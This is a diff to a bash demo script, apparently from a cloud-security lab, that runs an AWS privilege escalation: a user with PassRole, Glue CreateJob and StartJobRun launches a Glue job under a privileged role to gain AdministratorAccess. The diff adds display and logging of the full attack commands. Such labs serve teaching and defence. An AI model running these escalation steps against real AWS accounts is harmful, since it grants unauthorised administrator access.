@@ -3,7 +3,9 @@
 # Demo script for iam:PassRole + glue:CreateJob + glue:StartJobRun privilege escalation
 # This script demonstrates how a user with PassRole, CreateJob, and StartJobRun can escalate to admin
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -11,6 +13,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-glue-003-to-admin-starting-user"
@@ -70,6 +90,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -81,6 +102,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -88,6 +110,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify lack of admin permissions
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -124,6 +147,7 @@ TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
 echo "Target Role ARN: $TARGET_ROLE_ARN"
 echo "Job Name: $GLUE_JOB_NAME"
 
+show_attack_cmd "aws glue create-job --region $AWS_REGION --name \"$GLUE_JOB_NAME\" --role \"$TARGET_ROLE_ARN\" --command \"Name=pythonshell,ScriptLocation=${SCRIPT_S3_PATH},PythonVersion=3.9\" --default-arguments '{\"--job-language\":\"python\"}' --max-capacity 0.0625 --timeout 5 --output json"
 aws glue create-job \
     --region $AWS_REGION \
     --name "$GLUE_JOB_NAME" \
@@ -146,6 +170,7 @@ echo ""
 echo -e "${YELLOW}Step 7: Starting Glue job run${NC}"
 echo "Starting job: $GLUE_JOB_NAME"
 
+show_attack_cmd "aws glue start-job-run --region $AWS_REGION --job-name \"$GLUE_JOB_NAME\" --output json"
 JOB_RUN_OUTPUT=$(aws glue start-job-run \
     --region $AWS_REGION \
     --job-name "$GLUE_JOB_NAME" \
@@ -169,6 +194,7 @@ MAX_WAIT=300  # 5 minutes
 ELAPSED=0
 
 while [ $ELAPSED -lt $MAX_WAIT ]; do
+    show_cmd "aws glue get-job-run --region $AWS_REGION --job-name \"$GLUE_JOB_NAME\" --run-id \"$JOB_RUN_ID\" --query 'JobRun.JobRunState' --output text"
     JOB_STATUS=$(aws glue get-job-run \
         --region $AWS_REGION \
         --job-name "$GLUE_JOB_NAME" \
@@ -212,6 +238,7 @@ echo -e "${GREEN}✓ Policy propagation complete${NC}\n"
 echo -e "${YELLOW}Step 10: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
+show_cmd "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -239,6 +266,13 @@ echo -e "  → Glue Job with $TARGET_ROLE"
 echo -e "  → (glue:StartJobRun) → Execute Python Script"
 echo -e "  → (iam:AttachUserPolicy) → Admin Access"
 
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- Glue Job: $GLUE_JOB_NAME"
 echo "- Policy Attachment: AdministratorAccess on $STARTING_USER"
@@ -250,3 +284,6 @@ echo ""
 echo -e "${YELLOW}To clean up and restore the original state:${NC}"
 echo "  ./cleanup_attack.sh"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
